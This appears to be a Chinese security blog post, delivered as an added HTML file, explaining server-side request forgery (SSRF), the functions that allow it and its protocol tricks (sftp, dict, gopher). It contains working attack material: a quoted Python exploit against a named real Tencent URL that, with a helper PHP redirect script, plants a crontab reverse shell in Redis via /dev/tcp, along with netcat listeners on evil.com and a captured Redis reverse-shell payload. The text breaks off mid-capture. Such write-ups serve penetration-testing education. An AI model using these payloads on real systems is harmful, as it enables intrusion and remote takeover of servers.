@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#6c599f">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/./images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/./images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/./images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/./images/safari-pinned-tab-next.svg" color="#6c599f">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=EB Garamond, Noto Serif SC:300,300italic,400,400italic,700,700italic|Long Cang:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"localhost","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言SSRF是非常容易忽略的一个漏洞，我甚至在渗透测试的项目中甚至不会去深究这方面的漏洞，因为它通常危害较小，并且极难利用。但是上次我在一个项目中发现了一个SSRF，并且同服务器还有另一个对内开放的网站，这样这个SSRF就为攻击者建立了一个从对外开放到网站渗透到对内开放的网站。最后利用SSRF探测到了对内开放的那个网站有sql注入，虽然没有getshell，但是还是引起了重视，SSRF在很多时候还">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF的那些问题">
+<meta property="og:url" content="http://localhost:4000/posts/SSRF%E7%9A%84%E9%82%A3%E4%BA%9B%E9%97%AE%E9%A2%98/">
+<meta property="og:site_name" content="匆匆那年">
+<meta property="og:description" content="前言SSRF是非常容易忽略的一个漏洞，我甚至在渗透测试的项目中甚至不会去深究这方面的漏洞，因为它通常危害较小，并且极难利用。但是上次我在一个项目中发现了一个SSRF，并且同服务器还有另一个对内开放的网站，这样这个SSRF就为攻击者建立了一个从对外开放到网站渗透到对内开放的网站。最后利用SSRF探测到了对内开放的那个网站有sql注入，虽然没有getshell，但是还是引起了重视，SSRF在很多时候还">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-02-11T15:12:57.000Z">
+<meta property="article:modified_time" content="2022-03-23T07:35:08.639Z">
+<meta property="article:author" content="Geez">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://localhost:4000/posts/SSRF%E7%9A%84%E9%82%A3%E4%BA%9B%E9%97%AE%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SSRF的那些问题 | 匆匆那年</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">匆匆那年</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">钟声敲在你我耳边</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-fas fa-home"></i>首页</a>
+
+  </li>
+        
+            
+  <li class="menu-item menu-item-overview">
+
+    <a href="/overview/" rel="section"><i class="fa fa-fw fa-fas fa-archive"></i>总览</a>
+
+  </li>
+
+
+      
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-fas fa-location-arrow"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-fas fa-heart"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/posts/SSRF%E7%9A%84%E9%82%A3%E4%BA%9B%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Geez">
+      <meta itemprop="description" content="黑客,诗人,养龟仔">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="匆匆那年">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSRF的那些问题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发布：</span>
+
+              <time title="创建时间：2020-02-11 23:12:57" itemprop="dateCreated datePublished" datetime="2020-02-11T23:12:57+08:00">2020-02-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-23 15:35:08" itemprop="dateModified" datetime="2022-03-23T15:35:08+08:00">2022-03-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类：</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/overview/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SSRF是非常容易忽略的一个漏洞，我甚至在渗透测试的项目中甚至不会去深究这方面的漏洞，因为它通常危害较小，并且极难利用。但是上次我在一个项目中发现了一个SSRF，并且同服务器还有另一个对内开放的网站，这样这个SSRF就为攻击者建立了一个从对外开放到网站渗透到对内开放的网站。最后利用SSRF探测到了对内开放的那个网站有sql注入，虽然没有getshell，但是还是引起了重视，SSRF在很多时候还是有用武之地的。</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。很晦涩！！！举个例子：服务端有一个在线加载图片的功能，你传入一个图片URL，网站就会加载出来对应图片，所以图片的URL是网站服务器去访问的，如果我们利用这点传入一些只有服务端才能进行访问的URL，比如不对外开放的后台地址，那么这个过程就是服务端的请求伪造。</p>
+<span id="more"></span>
+
+<h3 id="常简存在SSRF漏洞的函数"><a href="#常简存在SSRF漏洞的函数" class="headerlink" title="常简存在SSRF漏洞的函数"></a>常简存在SSRF漏洞的函数</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>1.file_get_contents()<br>2.fsockopen()<br>3.curl_exec()   默认不支持302跳转的</p>
+<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>1.HttpClient<br>2.Request (对HttpClient封装后的类)<br>3.HttpURLConnection<br>4.URLConnection<br>5.URL<br>6.okhttp<br>以上的几个发送网络请求的类都有可能导致SSRF，但是java的各个类对协议的支持各有不同，所以利用过程首先得确定支持哪些协议。</p>
+<h3 id="SSRF支持的协议"><a href="#SSRF支持的协议" class="headerlink" title="SSRF支持的协议"></a>SSRF支持的协议</h3><p>这里协议描述的细一点，也参考了各个文章的trick。因为协议的技巧都是通用的，xxe、文件读取、文件包含等都可能用的上。</p>
+<table>
+<thead>
+<tr>
+<th>语言支持协议表</th>
+<th>php</th>
+<th>Java</th>
+<th>curl</th>
+<th>Perl</th>
+<th>ASP.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http&#x2F;https</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+</tr>
+<tr>
+<td>gopher</td>
+<td>-with-curlwrappers</td>
+<td>Before JDK1.7</td>
+<td>before 7.49.0 不支持\x00</td>
+<td>&amp;radic;</td>
+<td>Before version 3</td>
+</tr>
+<tr>
+<td>tftp</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>before 7.49.0 不支持\x00</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>dict</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>&amp;radic;</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>file</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+</tr>
+<tr>
+<td>imap</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>X</td>
+</tr>
+<tr>
+<td>pop3</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>X</td>
+</tr>
+<tr>
+<td>rtsp</td>
+<td>-with-curlwrappers</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+</tr>
+<tr>
+<td>smb</td>
+<td>-with-curlwrappers</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+<td>&amp;radic;</td>
+</tr>
+<tr>
+<td>smtp</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>&amp;radic;</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>telnet</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>&amp;radic;</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>ssh2</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>受限于NET:SSH2</td>
+<td>X</td>
+</tr>
+<tr>
+<td>ogg</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>expect</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>ldap</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>&amp;radic;</td>
+<td>X</td>
+</tr>
+<tr>
+<td>php</td>
+<td>&amp;radic;</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>zlib&#x2F;bzip&#x2F;zip</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+</tbody></table>
+<p><strong>SFTP</strong></p>
+<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://test.net/ssrf.php?url=sftp://evil.com:11111/</span><br><span class="line"></span><br><span class="line">evil.com:</span><br><span class="line">$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)SSH-2.0-libssh2_1.4.2</span><br><span class="line"></span><br><span class="line"><span class="comment">#不要天真的以为它是sftp就能传文件到服务器上。</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>DICT</strong></p>
+<p>DICT主要用来探测端口和服务是否开启，当然它也可以进行redis的利用，乌云的猪猪侠就有一个经典的SSRF+dict协议+redis未授权 getshell，此外小米也出现过相同的问题，所以DICT协议在SSRF用处还是蛮大的。</p>
+<p>判断DICT是否可用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?dict://attacker:11111/</span><br><span class="line"></span><br><span class="line">evil.com:$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
+
+<p>探测端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接dict://ip:port/</span></span><br><span class="line">http://192.168.37.18/ssrf/?url=dict://127.0.0.1:9999</span><br><span class="line"><span class="comment">#一般来说 端口存在 立马响应(多为内置的报错页面，或者对应服务信息) 不存在的端口会延迟响应(多为无法连接) 可以通过已知开放端口的响应结果俩进行区分。</span></span><br></pre></td></tr></table></figure>
+
+<p>使用dict协议向Redis数据库写shell<br>关于dict协议：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=dict://serverip:port/">dict:&#x2F;&#x2F;serverip:port&#x2F;</a>命令:参数<br>向服务器的端口请求 命令:参数，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</p>
+</blockquote>
+<p>DICT对redis的利用(引用了腾讯的SSRF漏洞的代码)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># email: ringzero@0x557.org</span></span><br><span class="line">import requests</span><br><span class="line">host = <span class="string">&#x27;42.62.67.198&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">bhost = <span class="string">&#x27;fuzz.wuyun.org&#x27;</span></span><br><span class="line">bport = <span class="string">&#x27;8080&#x27;</span></span><br><span class="line">vul_httpurl = <span class="string">&#x27;http://share.v.t.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=&#x27;</span></span><br><span class="line">_location = <span class="string">&#x27;http://fuzz.wuyun.org/302.php&#x27;</span></span><br><span class="line">shell_location = <span class="string">&#x27;http://fuzz.wuyun.org/shell.php&#x27;</span></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#2 set crontab command</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=&#123;bport&#125;&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port,</span><br><span class="line">    bhost = bhost,</span><br><span class="line">    bport = bport)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(shell_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#3 config set dir /var/spool/cron/</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dir:/var/spool/cron/&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#4 config set dbfilename root</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dbfilename:root&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#5 save to file</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.php 辅助脚本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$bhost</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bhost&#x27;</span>];</span><br><span class="line"><span class="variable">$bport</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bport&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/<span class="subst">&#123;$bhost&#125;</span>/<span class="subst">&#123;$bport&#125;</span>\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>gopher</strong></p>
+<p>这个协议要写的长一点,他是一个TCP&#x2F;IP层协议，所以可以干很多事情，它可以GET请求也可以POST请求,还可以发邮件、攻击mysql、redis、fastcgi等等，总之就是挺强大的。但是记住gopher协议的默认端口是70,所以如果伪造http协议记得写端口。另外推荐一个生成gopher协议payload的工具：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">gopherus</a>（注意payload需要URL编码一次，也就是二次编码）</p>
+<p>gopher可以进行get和post和其他一些协议的处理,尤其是POST,所以经常用来进行漏洞利用,比如内网的其他网站的攻击,上传文件,POST一些参数等等。gopher协议的格式:<code>gopher:/ip:port/_ + payload</code><br>下面举个例子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#如果你想要访问一个内网才可以访问的地址</span></span><br><span class="line">http://192.168.37.18/ssrf/?url=gopher://192.168.37.18:80/%20GET%20/index.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你想要POST数据到对应内网网址（回车换行符号要进行2次url编码%250d%250a）</span></span><br><span class="line">http://192.168.34.29/ssrf/index.php?url=gopher://192.168.34.29:80/_POST%20%2fssrf%2fflag.php%20HTTP%2f1.1%250d%250aHost%3A%20192.168.34.29%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%206%250d%250a%250d%250aflag%3D1（在nginx 1.11下POST数据未成功，日志查询POST为两个 - 现在还没找到原因，知道原因的同学可以留言）</span><br><span class="line"></span><br><span class="line"><span class="comment">#其他的不常见payload 你可以用上面我给出的工具进行生成，比如：</span></span><br><span class="line">gopherus --exploit zabbix</span><br><span class="line">gopherus --exploit redis</span><br><span class="line">gopherus --exploit mysql</span><br><span class="line">...</span><br><span class="line">gopher是SSRF中最强大的一个协议，请首先确定该协议是否可用。</span><br></pre></td></tr></table></figure>
+<p>gopher为啥特别危险呢？因为他可以被称为万能协议，可以发起其他各种协议的请求，攻击redis、mysql、fastcgi等。<br>比如攻击redis：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 抓取redis反弹那shell的包如下</span></span><br><span class="line">[root@Centos ~]<span class="comment"># socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span></span><br><span class="line">&gt; 2018/09/25 10:35:24.944863  length=18 from=0 to=17</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$8</span>\r</span><br><span class="line">flushall\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.948320  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.955995  length=88 from=0 to=87</span><br><span class="line">*3\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$1</span>\r</span><br><span class="line">1\r</span><br><span class="line"><span class="variable">$61</span>\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.956209  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.959588  length=57 from=0 to=56</span><br><span class="line">*4\r</span><br><span class="line"><span class="variable">$6</span>\r</span><br><span class="line">config\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">dir</span>\r</span><br><span class="line"><span class="variable">$16</span>\r</span><br><span class="line">/var/spool/cron/\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.960138  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.967473  length=52 from=0 to=51</span><br><span class="line">*4\r</span><br><span class="line"><span class="variable">$6</span>\r</span><br><span class="line">config\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$10</span>\r</span><br><span 